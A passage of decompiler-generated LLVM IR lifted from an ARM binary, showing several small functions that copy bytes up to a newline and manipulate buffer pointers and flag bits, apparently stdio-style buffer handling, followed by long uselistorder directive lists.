bb24:                                             ; preds = %.preheader, %dec_label_pc_15fe0
  %v2_15fcc = phi i32 [ %v2_15fcc.pre, %.preheader ], [ %v1_15fe4, %dec_label_pc_15fe0 ]
  %v0_15fc0 = load i32, i32* %r6.global-to-local, align 4
  %v1_15fc0 = inttoptr i32 %v0_15fc0 to i8*
  %v2_15fc0 = load i8, i8* %v1_15fc0, align 1
  %v3_15fc0 = zext i8 %v2_15fc0 to i32
  store i32 %v3_15fc0, i32* %r3.global-to-local, align 4
  %v7_15fc4 = icmp eq i8 %v2_15fc0, 10
  store i1 %v7_15fc4, i1* %cpsr_z.global-to-local, align 1
  %v1_15fc8 = add i32 %v0_15fc0, 1
  store i32 %v1_15fc8, i32* %r6.global-to-local, align 4
  %v3_15fcc = inttoptr i32 %v2_15fcc to i8*
  store i8 %v2_15fc0, i8* %v3_15fcc, align 1
  %v0_15fd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fd0, label %dec_label_pc_15fd4, label %dec_label_pc_15fe0

dec_label_pc_15fd4:                               ; preds = %bb24
  %v0_15fd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15fd4 = inttoptr i32 %v0_15fd4 to i16*
  %v2_15fd4 = load i16, i16* %v1_15fd4, align 2
  %v3_15fd4 = zext i16 %v2_15fd4 to i32
  store i32 %v3_15fd4, i32* %r3.global-to-local, align 4
  %v1_15fd8 = and i32 %v3_15fd4, 256
  %v2_15fd8 = icmp eq i32 %v1_15fd8, 0
  store i1 %v2_15fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15fd8, label %dec_label_pc_15fe0, label %dec_label_pc_15fd4.dec_label_pc_15fec_crit_edge

dec_label_pc_15fd4.dec_label_pc_15fec_crit_edge:  ; preds = %dec_label_pc_15fd4
  %v0_15ff0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15fec

dec_label_pc_15fe0:                               ; preds = %dec_label_pc_15fd4, %bb24
  %v0_15fe0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe0 = add i32 %v0_15fe0, -1
  store i32 %v1_15fe0, i32* %r2.global-to-local, align 4
  %v7_15fe0 = icmp eq i32 %v0_15fe0, 1
  store i1 %v7_15fe0, i1* %cpsr_z.global-to-local, align 1
  %v0_15fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fe4 = add i32 %v0_15fe4, 1
  store i32 %v1_15fe4, i32* %r1.global-to-local, align 4
  br i1 %v7_15fe0, label %dec_label_pc_15fe0.dec_label_pc_15fec_crit_edge, label %bb24

dec_label_pc_15fe0.dec_label_pc_15fec_crit_edge:  ; preds = %dec_label_pc_15fe0
  %v0_15fec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %dec_label_pc_15fd4.dec_label_pc_15fec_crit_edge, %dec_label_pc_15fe0.dec_label_pc_15fec_crit_edge
  %v0_15ff0 = phi i32 [ %v1_15fe4, %dec_label_pc_15fe0.dec_label_pc_15fec_crit_edge ], [ %v0_15ff0.pre, %dec_label_pc_15fd4.dec_label_pc_15fec_crit_edge ]
  %v0_15fec = phi i32 [ %v0_15fec.pre, %dec_label_pc_15fe0.dec_label_pc_15fec_crit_edge ], [ %v0_15fd4, %dec_label_pc_15fd4.dec_label_pc_15fec_crit_edge ]
  %v1_15fec = add i32 %v0_15fec, 8
  %v2_15fec = inttoptr i32 %v1_15fec to i32*
  %v3_15fec = load i32, i32* %v2_15fec, align 4
  store i32 %v3_15fec, i32* %r3.global-to-local, align 4
  %v2_15ff0 = add i32 %v0_15fec, 16
  %v3_15ff0 = inttoptr i32 %v2_15ff0 to i32*
  store i32 %v0_15ff0, i32* %v3_15ff0, align 4
  %v0_15ff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15ff4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15ff4 = sub i32 %v1_15ff4, %v0_15ff4
  store i32 %v2_15ff4, i32* %r3.global-to-local, align 4
  %v1_15ff8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15ff8 = sub i32 %v1_15ff8, %v2_15ff4
  store i32 %v2_15ff8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15f9c.dec_label_pc_15ffc_crit_edge, %dec_label_pc_15fec
  %v0_15ffc = phi i32 [ %v0_15ffc.pre, %dec_label_pc_15f9c.dec_label_pc_15ffc_crit_edge ], [ %v2_15ff8, %dec_label_pc_15fec ]
  %v1_15ffc = load i32, i32* @r7, align 4
  %v2_15ffc = sub i32 %v1_15ffc, %v0_15ffc
  br label %dec_label_pc_16000

dec_label_pc_15f70.dec_label_pc_16000.loopexit_crit_edge: ; preds = %dec_label_pc_15f70thread-pre-split
  %v0_16000.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16000

dec_label_pc_16000:                               ; preds = %dec_label_pc_15f58, %dec_label_pc_15f70.dec_label_pc_16000.loopexit_crit_edge, %dec_label_pc_15ffc
  %v0_16000 = phi i32 [ %v2_15ffc, %dec_label_pc_15ffc ], [ %v0_16000.pre.pre, %dec_label_pc_15f70.dec_label_pc_16000.loopexit_crit_edge ], [ 0, %dec_label_pc_15f58 ]
  %v2_16004 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16004, i32* %r4.global-to-local, align 4
  ret i32 %v0_16000

; uselistorder directives
  uselistorder i32 %v0_15fec, { 1, 0 }
  uselistorder i32 %v1_15fe4, { 0, 2, 1 }
  uselistorder i32 %v0_15fe0, { 1, 0 }
  uselistorder i32 %v1_15fb8, { 0, 2, 1 }
  uselistorder i32 %v0_15fb8, { 1, 0 }
  uselistorder i32 %v5_15fa4, { 1, 0 }
  uselistorder i32 %v2_15fa4, { 1, 0, 2 }
  uselistorder i32 %v3_15f88, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15f80, { 1, 0 }
  uselistorder i32 %v5_15f94, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 256, { 282, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 274, 283, 280, 281, 284, 36, 38, 37, 39, 273, 40, 41, 42, 0, 279, 1, 43, 44, 45, 46, 48, 49, 50, 47, 52, 53, 54, 51, 55, 277, 56, 285, 286, 57, 58, 59, 288, 60, 61, 62, 63, 64, 65, 66, 67, 68, 71, 70, 69, 72, 278, 289, 287, 73, 74, 75, 76, 78, 77, 79, 81, 80, 82, 84, 83, 85, 290, 86, 291, 95, 90, 96, 91, 92, 87, 88, 97, 93, 89, 94, 98, 99, 100, 101, 102, 103, 104, 111, 108, 112, 109, 113, 110, 105, 106, 107, 114, 115, 116, 117, 127, 123, 118, 128, 124, 129, 125, 119, 120, 121, 130, 126, 122, 131, 132, 133, 134, 135, 136, 2, 137, 3, 146, 142, 147, 143, 138, 139, 140, 148, 144, 149, 145, 141, 150, 151, 152, 153, 154, 164, 165, 159, 166, 160, 155, 156, 161, 167, 162, 168, 163, 157, 158, 169, 170, 171, 172, 177, 175, 173, 178, 176, 174, 179, 180, 182, 184, 185, 183, 181, 186, 275, 292, 187, 189, 188, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 204, 202, 200, 205, 203, 201, 206, 207, 209, 211, 212, 210, 208, 213, 276, 293, 214, 216, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 4, 229, 234, 241, 235, 242, 236, 230, 231, 243, 237, 232, 238, 244, 239, 233, 240, 245, 246, 247, 248, 249, 250, 255, 262, 256, 263, 257, 251, 252, 264, 258, 253, 259, 265, 260, 254, 261, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10ce4, { 2, 1, 0 }
  uselistorder i32 4, { 202, 203, 204, 196, 197, 326, 205, 454, 5, 6, 206, 7, 8, 68, 0, 9, 76, 71, 72, 10, 455, 73, 456, 59, 11, 12, 74, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 13, 474, 475, 476, 477, 478, 479, 58, 480, 481, 482, 483, 484, 485, 14, 15, 75, 486, 207, 93, 208, 16, 209, 94, 210, 211, 212, 213, 129, 214, 215, 216, 217, 218, 219, 17, 198, 199, 200, 201, 278, 279, 191, 192, 193, 194, 195, 487, 130, 95, 488, 18, 489, 131, 132, 60, 395, 396, 397, 398, 399, 400, 133, 134, 19, 401, 402, 403, 404, 405, 406, 407, 408, 135, 393, 394, 369, 370, 371, 372, 373, 374, 375, 376, 377, 20, 378, 379, 380, 409, 21, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 136, 137, 138, 424, 425, 428, 431, 426, 427, 96, 139, 429, 51, 430, 432, 433, 434, 436, 140, 23, 22, 435, 141, 142, 143, 246, 144, 52, 24, 25, 280, 281, 282, 283, 284, 26, 285, 437, 438, 190, 27, 28, 97, 247, 61, 248, 101, 249, 102, 239, 103, 240, 104, 241, 250, 251, 29, 252, 77, 98, 99, 232, 233, 242, 243, 100, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 234, 235, 236, 237, 238, 244, 245, 54, 53, 253, 69, 254, 30, 255, 31, 56, 55, 257, 32, 256, 258, 259, 264, 105, 266, 106, 267, 107, 268, 269, 265, 260, 108, 261, 262, 263, 439, 270, 67, 66, 65, 271, 109, 33, 34, 35, 36, 37, 38, 272, 63, 62, 273, 64, 110, 274, 275, 276, 111, 277, 39, 293, 294, 295, 145, 296, 297, 298, 299, 146, 147, 112, 300, 113, 302, 78, 303, 304, 305, 148, 306, 307, 149, 150, 308, 79, 309, 80, 310, 311, 151, 312, 313, 152, 153, 314, 114, 315, 81, 316, 154, 155, 156, 317, 318, 115, 82, 319, 320, 157, 321, 322, 323, 158, 159, 1, 116, 324, 83, 325, 327, 328, 160, 329, 330, 161, 162, 2, 117, 331, 84, 333, 85, 334, 335, 336, 337, 163, 338, 339, 164, 165, 340, 341, 118, 342, 3, 343, 86, 344, 119, 345, 346, 347, 348, 166, 349, 350, 167, 168, 351, 352, 120, 353, 4, 354, 87, 355, 121, 356, 169, 170, 171, 357, 358, 122, 88, 359, 360, 361, 362, 172, 363, 364, 173, 174, 124, 365, 123, 366, 89, 367, 90, 368, 440, 441, 442, 443, 444, 126, 445, 127, 446, 175, 447, 57, 448, 176, 177, 128, 449, 125, 450, 91, 451, 92, 453, 178, 40, 381, 179, 41, 382, 180, 42, 383, 181, 43, 384, 182, 44, 385, 183, 70, 45, 386, 387, 184, 46, 388, 185, 47, 389, 186, 48, 390, 187, 49, 391, 188, 50, 392, 452, 332, 286, 287, 288, 289, 290, 291, 189, 292, 301 }
  uselistorder i32 2147483647, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32* @r7, { 3, 36, 37, 25, 26, 27, 28, 29, 30, 31, 32, 35, 4, 38, 39, 40, 5, 41, 42, 43, 19, 44, 45, 6, 46, 47, 48, 49, 50, 51, 7, 52, 53, 54, 55, 56, 57, 33, 34, 334, 335, 201, 202, 296, 297, 24, 336, 337, 338, 343, 344, 8, 58, 59, 9, 129, 130, 131, 0, 132, 298, 299, 300, 301, 302, 303, 304, 305, 306, 279, 280, 281, 282, 283, 284, 307, 308, 309, 310, 311, 312, 313, 314, 10, 315, 316, 317, 318, 319, 260, 261, 80, 81, 133, 134, 82, 83, 262, 263, 264, 265, 84, 85, 148, 149, 150, 151, 152, 157, 158, 159, 160, 161, 153, 154, 155, 156, 162, 163, 164, 165, 166, 167, 320, 321, 341, 342, 86, 87, 88, 89, 252, 253, 339, 340, 209, 210, 168, 169, 203, 204, 135, 136, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 322, 323, 21, 324, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 76, 77, 63, 60, 11, 61, 1, 62, 75, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 78, 79, 114, 115, 116, 117, 118, 119, 120, 211, 212, 213, 214, 121, 122, 123, 124, 125, 126, 127, 128, 137, 138, 12, 139, 140, 141, 142, 143, 144, 145, 146, 147, 180, 181, 182, 183, 184, 185, 186, 187, 188, 215, 216, 217, 218, 219, 220, 221, 222, 13, 223, 224, 225, 226, 227, 228, 229, 230, 14, 231, 232, 233, 16, 15, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 22, 247, 248, 249, 250, 251, 254, 23, 255, 256, 257, 258, 259, 18, 17, 266, 267, 268, 269, 270, 271, 2, 272, 273, 274, 275, 276, 277, 278, 325, 326, 327, 328, 329, 330, 331, 332, 333, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 191, 189, 190, 20, 192, 193, 194, 195, 196, 197, 198, 199, 200, 205, 206, 207, 208 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_16000, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15ffc, { 1, 0 }
  uselistorder label %dec_label_pc_15fec, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15f78, { 1, 0 }
}

define i32 @function_1600c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1600c:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1600c = load i32, i32* @r4, align 4
  store i32 %v3_1600c, i32* %stack_var_-8, align 4
  %v1_16010 = add i32 %arg1, 8
  %v1_16014 = inttoptr i32 %v1_16010 to i32*
  %v2_16014 = load i32, i32* %v1_16014, align 4
  %v3_16014 = add i32 %arg1, 12
  %v4_16014 = inttoptr i32 %v3_16014 to i32*
  %v5_16014 = load i32, i32* %v4_16014, align 4
  %v2_16018 = sub i32 %v5_16014, %v2_16014
  store i32 %v2_16018, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16020 = inttoptr i32 %arg1 to i16*
  %v4_16020 = call i32 @function_15f00(i16* %v3_16020, i32 %v2_16014, i32 %v2_16018)
  %v0_16024 = load i32, i32* @r4, align 4
  %v1_16024 = add i32 %v0_16024, 8
  %v2_16024 = inttoptr i32 %v1_16024 to i32*
  %v3_16024 = load i32, i32* %v2_16024, align 4
  store i32 %v3_16024, i32* %r2.global-to-local, align 4
  %v2_16028 = add i32 %v3_16024, %v4_16020
  %v2_1602c = add i32 %v0_16024, 20
  %v3_1602c = inttoptr i32 %v2_1602c to i32*
  store i32 %v2_16028, i32* %v3_1602c, align 4
  %v0_16030 = load i32, i32* %r2.global-to-local, align 4
  %v1_16030 = load i32, i32* @r4, align 4
  %v2_16030 = add i32 %v1_16030, 16
  %v3_16030 = inttoptr i32 %v2_16030 to i32*
  store i32 %v0_16030, i32* %v3_16030, align 4
  %v2_16034 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16034, i32* @r4, align 4
  ret i32 %v4_16020

; uselistorder directives
  uselistorder i32 %v4_16020, { 1, 0 }
  uselistorder i32 20, { 32, 115, 3, 116, 117, 1, 118, 33, 7, 34, 35, 36, 37, 31, 46, 47, 27, 28, 29, 30, 119, 8, 120, 107, 108, 109, 2, 48, 9, 49, 50, 0, 38, 40, 4, 42, 10, 43, 26, 41, 39, 44, 45, 11, 12, 13, 14, 52, 15, 53, 54, 55, 56, 57, 58, 16, 59, 60, 61, 62, 63, 64, 17, 65, 66, 67, 68, 69, 70, 71, 72, 73, 18, 74, 75, 76, 77, 78, 79, 80, 81, 19, 82, 83, 84, 85, 86, 87, 20, 88, 89, 21, 90, 91, 92, 93, 22, 94, 95, 23, 96, 97, 98, 99, 100, 101, 102, 5, 103, 24, 104, 105, 106, 110, 6, 111, 25, 112, 113, 114, 51 }
  uselistorder i32 12, { 9, 10, 40, 11, 12, 43, 6, 172, 173, 174, 175, 176, 178, 179, 177, 180, 181, 182, 183, 184, 185, 186, 13, 14, 15, 16, 18, 17, 19, 44, 45, 20, 46, 47, 48, 49, 50, 41, 42, 88, 89, 37, 38, 39, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 3, 121, 122, 123, 124, 125, 21, 126, 144, 22, 23, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 163, 156, 157, 158, 159, 160, 161, 162, 164, 165, 24, 166, 4, 90, 91, 25, 92, 93, 26, 67, 68, 69, 54, 70, 51, 71, 62, 52, 53, 55, 56, 57, 58, 59, 60, 61, 64, 27, 63, 28, 65, 29, 66, 72, 73, 74, 5, 75, 76, 77, 78, 80, 81, 36, 82, 30, 83, 31, 84, 32, 85, 87, 86, 79, 167, 94, 33, 95, 96, 97, 98, 99, 100, 101, 34, 102, 103, 104, 35, 105, 106, 107, 108, 109, 110, 7, 111, 112, 113, 114, 115, 116, 8, 117, 118, 119, 120, 168, 169, 170, 171, 0, 1, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_1603c() local_unnamed_addr {
dec_label_pc_1603c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1603c = load i32, i32* @r4, align 4
  store i32 %v3_1603c, i32* %stack_var_-12, align 4
  %v0_16040 = load i32, i32* @r0, align 4
  %v1_16040 = inttoptr i32 %v0_16040 to i16*
  %v2_16040 = load i16, i16* %v1_16040, align 2
  %v3_16040 = zext i16 %v2_16040 to i32
  store i32 %v3_16040, i32* %r3.global-to-local, align 4
  %v0_16044 = load i32, i32* @r1, align 4
  %v2_16044 = and i32 %v0_16044, %v3_16040
  %v4_16044 = icmp eq i32 %v2_16044, 0
  store i32 %v0_16040, i32* @r4, align 4
  br i1 %v4_16044, label %dec_label_pc_16054, label %dec_label_pc_16064

dec_label_pc_16054:                               ; preds = %dec_label_pc_1603c
  %v1_16054 = and i32 %v3_16040, 2176
  %v2_16054 = icmp eq i32 %v1_16054, 0
  br i1 %v2_16054, label %dec_label_pc_1605c, label %dec_label_pc_16070

dec_label_pc_1605c:                               ; preds = %dec_label_pc_16054
  %v2_1605c = or i32 %v0_16044, %v3_16040
  store i32 %v2_1605c, i32* %r3.global-to-local, align 4
  %v1_16060 = trunc i32 %v2_1605c to i16
  store i16 %v1_16060, i16* %v1_16040, align 2
  %v0_16064.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_1603c, %dec_label_pc_1605c
  %v0_16064 = phi i32 [ %v0_16040, %dec_label_pc_1603c ], [ %v0_16064.pre, %dec_label_pc_1605c ]
  %v1_16064 = inttoptr i32 %v0_16064 to i16*
  %v2_16064 = load i16, i16* %v1_16064, align 2
  %v3_16064 = zext i16 %v2_16064 to i32
  store i32 %v3_16064, i32* %r3.global-to-local, align 4
  %v1_16068 = and i32 %v3_16064, 16
  store i32 %v1_16068, i32* %r5.global-to-local, align 4
  %v2_16068 = icmp eq i32 %v1_16068, 0
  br i1 %v2_16068, label %dec_label_pc_16090, label %dec_label_pc_16070

dec_label_pc_16070:                               ; preds = %dec_label_pc_16054, %dec_label_pc_16064
  %v0_16070 = call i32 @function_11200()
  store i32 %v0_16070, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_16078 = inttoptr i32 %v0_16070 to i32*
  store i32 9, i32* %v2_16078, align 4
  br label %dec_label_pc_1607c

dec_label_pc_1607c:                               ; preds = %dec_label_pc_16098, %dec_label_pc_16070
  %v0_1607c = load i32, i32* @r4, align 4
  %v1_1607c = inttoptr i32 %v0_1607c to i16*
  %v2_1607c = load i16, i16* %v1_1607c, align 2
  %v3_1607c = zext i16 %v2_1607c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16084 = or i32 %v3_1607c, 8
  store i32 %v1_16084, i32* %r3.global-to-local, align 4
  %v1_16088 = trunc i32 %v1_16084 to i16
  store i16 %v1_16088, i16* %v1_1607c, align 2
  %v1_160d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160c8

dec_label_pc_16090:                               ; preds = %dec_label_pc_16064
  %v1_16090 = and i32 %v3_16064, 64
  %v2_16090 = icmp eq i32 %v1_16090, 0
  br i1 %v2_16090, label %dec_label_pc_160b8, label %dec_label_pc_16098

dec_label_pc_16098:                               ; preds = %dec_label_pc_16090
  %v0_16098 = load i32, i32* @r0, align 4
  %v1_16098 = call i32 @function_14c74(i32 %v0_16098)
  store i32 %v1_16098, i32* %r0.global-to-local, align 4
  %v2_1609c = icmp eq i32 %v1_16098, 0
  br i1 %v2_1609c, label %dec_label_pc_160a4, label %dec_label_pc_1607c

dec_label_pc_160a4:                               ; preds = %dec_label_pc_16098
  %v0_160a4 = load i32, i32* @r4, align 4
  %v1_160a4 = inttoptr i32 %v0_160a4 to i16*
  %v2_160a4 = load i16, i16* %v1_160a4, align 2
  %v3_160a4 = zext i16 %v2_160a4 to i32
  store i32 %v3_160a4, i32* %r3.global-to-local, align 4
  %v1_160a8 = add i32 %v0_160a4, 8
  %v2_160a8 = inttoptr i32 %v1_160a8 to i32*
  %v3_160a8 = load i32, i32* %v2_160a8, align 4
  %v1_160ac = and i32 %v3_160a4, 65471
  store i32 %v1_160ac, i32* %r3.global-to-local, align 4
  %v2_160b0 = add i32 %v0_160a4, 28
  %v3_160b0 = inttoptr i32 %v2_160b0 to i32*
  store i32 %v3_160a8, i32* %v3_160b0, align 4
  %v0_160b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_160b4 = trunc i32 %v0_160b4 to i16
  %v2_160b4 = load i32, i32* @r4, align 4
  %v3_160b4 = inttoptr i32 %v2_160b4 to i16*
  store i16 %v1_160b4, i16* %v3_160b4, align 2
  %v0_160b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_160b8

dec_label_pc_160b8:                               ; preds = %dec_label_pc_16090, %dec_label_pc_160a4
  %v2_160c0 = phi i32 [ %v0_16064, %dec_label_pc_16090 ], [ %v0_160b8.pre, %dec_label_pc_160a4 ]
  %v1_160b8 = inttoptr i32 %v2_160c0 to i16*
  %v2_160b8 = load i16, i16* %v1_160b8, align 2
  %v3_160b8 = zext i16 %v2_160b8 to i32
  %v1_160bc = or i32 %v3_160b8, 1
  store i32 %v1_160bc, i32* %r3.global-to-local, align 4
  %v1_160c0 = trunc i32 %v1_160bc to i16
  store i16 %v1_160c0, i16* %v1_160b8, align 2
  %v0_160c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_160c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_1607c, %dec_label_pc_160b8
  %v1_160d0 = phi i32 [ %v1_160d0.pre, %dec_label_pc_1607c ], [ %v0_160c4, %dec_label_pc_160b8 ]
  %v2_160cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_160cc, i32* @r4, align 4
  ret i32 %v1_160d0

; uselistorder directives
  uselistorder i32 %v3_16040, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 23, 52, 7, 24, 25, 26, 40, 41, 21, 10, 22, 11, 12, 13, 14, 49, 50, 51, 8, 15, 19, 29, 0, 27, 16, 28, 17, 30, 18, 31, 1, 32, 2, 33, 3, 34, 4, 35, 5, 36, 6, 37, 9, 20, 39, 38, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_14c74, { 2, 1, 0 }
  uselistorder i32 64, { 13, 14, 15, 16, 20, 9, 10, 11, 12, 52, 17, 18, 19, 21, 22, 6, 23, 24, 25, 0, 26, 27, 28, 7, 29, 30, 31, 8, 32, 33, 34, 1, 35, 36, 37, 2, 38, 39, 40, 3, 41, 42, 43, 44, 45, 4, 46, 47, 48, 49, 50, 5, 51 }
  uselistorder i32 8, { 70, 71, 72, 73, 74, 75, 76, 63, 64, 65, 66, 127, 77, 219, 34, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 78, 79, 80, 81, 82, 83, 84, 28, 85, 86, 87, 88, 89, 90, 91, 92, 93, 67, 68, 69, 109, 110, 111, 45, 237, 238, 29, 164, 165, 166, 167, 168, 169, 170, 171, 7, 55, 172, 173, 174, 175, 176, 177, 178, 179, 8, 151, 152, 153, 154, 155, 156, 157, 158, 180, 181, 182, 183, 184, 9, 185, 186, 10, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 204, 197, 198, 199, 200, 56, 23, 201, 202, 203, 57, 58, 11, 205, 206, 207, 208, 210, 211, 59, 12, 212, 13, 209, 37, 38, 35, 36, 25, 26, 31, 32, 39, 239, 112, 113, 114, 115, 46, 61, 30, 14, 15, 22, 16, 40, 98, 99, 17, 18, 19, 100, 50, 94, 47, 95, 48, 96, 49, 97, 62, 33, 101, 102, 103, 24, 27, 105, 20, 51, 106, 52, 107, 108, 104, 118, 41, 119, 120, 121, 122, 123, 124, 125, 126, 3, 128, 129, 130, 4, 131, 132, 133, 134, 135, 136, 137, 5, 138, 139, 140, 141, 142, 143, 144, 6, 145, 146, 147, 148, 149, 150, 213, 214, 215, 216, 217, 218, 159, 42, 160, 43, 161, 44, 162, 53, 163, 0, 1, 60, 21, 116, 54, 117, 2 }
  uselistorder i32 9, { 5, 29, 24, 25, 57, 59, 6, 44, 4, 45, 7, 35, 30, 8, 9, 31, 10, 32, 11, 33, 12, 34, 26, 36, 2, 27, 28, 37, 13, 38, 14, 39, 15, 40, 16, 17, 18, 41, 42, 19, 43, 0, 20, 1, 21, 60, 46, 47, 22, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61, 62, 3, 58, 23 }
  uselistorder i32 16, { 118, 119, 120, 112, 113, 114, 115, 121, 33, 34, 35, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 122, 123, 124, 125, 126, 2, 1, 25, 51, 52, 53, 54, 129, 55, 130, 127, 128, 56, 57, 131, 9, 58, 59, 132, 133, 60, 61, 134, 135, 116, 117, 62, 154, 155, 108, 109, 110, 111, 63, 26, 149, 36, 64, 65, 66, 222, 223, 224, 225, 67, 226, 3, 68, 227, 228, 0, 229, 230, 69, 24, 156, 70, 157, 71, 72, 10, 23, 11, 12, 4, 13, 14, 73, 138, 37, 139, 140, 74, 136, 141, 137, 144, 145, 38, 107, 146, 75, 76, 15, 102, 16, 17, 77, 142, 143, 41, 40, 39, 147, 42, 148, 43, 78, 79, 80, 81, 82, 83, 84, 85, 150, 86, 151, 87, 152, 88, 153, 89, 90, 91, 92, 44, 231, 93, 159, 160, 161, 162, 27, 163, 164, 165, 166, 167, 28, 168, 169, 170, 171, 94, 45, 172, 173, 29, 174, 175, 18, 176, 177, 5, 95, 178, 179, 180, 30, 181, 182, 183, 184, 185, 6, 96, 186, 31, 187, 188, 189, 19, 190, 191, 103, 20, 104, 192, 97, 98, 193, 194, 7, 47, 195, 46, 196, 32, 197, 198, 199, 21, 200, 201, 105, 22, 106, 202, 99, 100, 203, 204, 8, 49, 205, 48, 206, 207, 101, 50, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 219, 218, 220, 221, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 242, 244, 245, 158 }
  uselistorder i32* @r1, { 15, 14, 62, 16, 17, 18, 19, 1, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 2, 95, 96, 20, 21, 22, 23, 0, 44, 45, 10, 24, 37, 38, 39, 3, 70, 68, 69, 4, 71, 5, 29, 30, 11, 63, 54, 55, 7, 25, 46, 12, 72, 73, 47, 8, 74, 48, 49, 31, 26, 27, 28, 33, 32, 56, 34, 35, 36, 40, 41, 42, 43, 50, 51, 52, 9, 53, 75, 76, 6, 57, 58, 59, 60, 61, 64, 65, 66, 67, 77, 13 }
  uselistorder label %dec_label_pc_160c8, { 1, 0 }
  uselistorder label %dec_label_pc_160b8, { 1, 0 }
  uselistorder label %dec_label_pc_16070, { 1, 0 }
  uselistorder label %dec_label_pc_16064, { 1, 0 }
}

define i32 @function_160d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_160d4:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_160d4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_160e4 = call i32 @function_11300()
  %v0_160e8 = load i32, i32* @r5, align 4
  %v1_160e8 = load i32, i32* @r4, align 4
  %v2_160e8 = add i32 %v1_160e8, %v0_160e8
  store i32 %v6_160d4, i32* @r5, align 4
  ret i32 %v2_160e8

; uselistorder directives
  uselistorder i32 ()* @function_11300, { 6, 7, 3, 0, 2, 1, 5, 4 }
